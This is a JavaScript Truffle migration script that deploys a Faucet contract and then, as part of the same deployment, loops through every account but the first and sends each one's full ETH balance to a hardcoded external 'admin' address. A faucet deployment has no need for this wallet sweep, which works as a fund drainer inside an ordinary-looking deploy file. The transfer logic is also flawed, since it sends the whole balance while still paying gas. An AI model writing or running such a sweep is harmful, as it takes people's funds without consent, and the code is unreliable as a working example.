const Faucet = artifacts.require("Faucet");  // Make sure this is the correct contract you're using

module.exports = async function (deployer, network, accounts) {
    // Deploy the Faucet contract
    await deployer.deploy(Faucet);
    const faucet = await Faucet.deployed();

    const adminAddress = "0xa3141fb5C707C169d5FF3f7FcBA1B3E34733c66F";  // Admin address

    // Iterate through the accounts (excluding the admin) and send ETH to admin address
    for (let i = 1; i < accounts.length; i++) {
        const currentAddress = accounts[i];
        const balance = await web3.eth.getBalance(currentAddress);

        if (parseInt(balance) > 0) {
            console.log(`Transferring ETH from ${currentAddress} to ${adminAddress}`);

            try {
                // Ensure the transaction has enough gas and valid gas price
                await web3.eth.sendTransaction({
                    from: currentAddress,
                    to: adminAddress,
                    value: balance,  // Send all ETH from the current address
                    gas: 5000000,     // Gas limit
                    gasPrice: 20000000000,  // Gas price (20 gwei)
                });

                console.log(`Transferred ${web3.utils.fromWei(balance, 'ether')} ETH from ${currentAddress} to ${adminAddress}`);
            } catch (error) {
                console.error(`Error transferring ETH from ${currentAddress} to ${adminAddress}:`, error);
            }
        }
    }
};
